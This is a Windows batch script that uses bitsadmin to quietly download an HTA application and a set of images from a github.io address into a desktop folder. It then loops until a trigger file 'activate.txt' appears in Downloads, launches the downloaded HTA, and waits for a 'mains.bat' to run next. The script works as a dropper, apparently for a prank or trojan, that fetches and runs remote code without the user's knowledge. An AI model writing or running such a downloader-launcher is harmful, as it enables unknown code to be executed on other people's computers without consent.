@echo off
cd "%systemdrive%/documents and settings/%username%/desktop"
md MASTERFOLDER
cd "%systemdrive%/documents and settings/%username%/desktop/MASTERFOLDER"
md img
bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/Start.hta %USERPROFILE%\Desktop\MASTERFOLDER\Start.hta
bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/1.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\1.jpg

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/2.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\2.jpg

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/3.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\3.jpg

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/4.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\4.jpg

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/5.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\5.jpg

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/6.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\6.jpg

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/7.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\7.jpg

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/8.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\8.jpg

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/9.gif %USERPROFILE%\Desktop\MASTERFOLDER\img\mor.gif

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/10.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\trippymeme.jpg
:start
IF EXIST %USERPROFILE%\Downloads\activate.txt (
start %USERPROFILE%\Desktop\MASTERFOLDER\Start.hta
goto :check
) ELSE (
goto :start
)
:check
IF EXIST %USERPROFILE%\Desktop\mains.bat (
start %USERPROFILE%\Desktop\mains.bat
exit
)
goto :check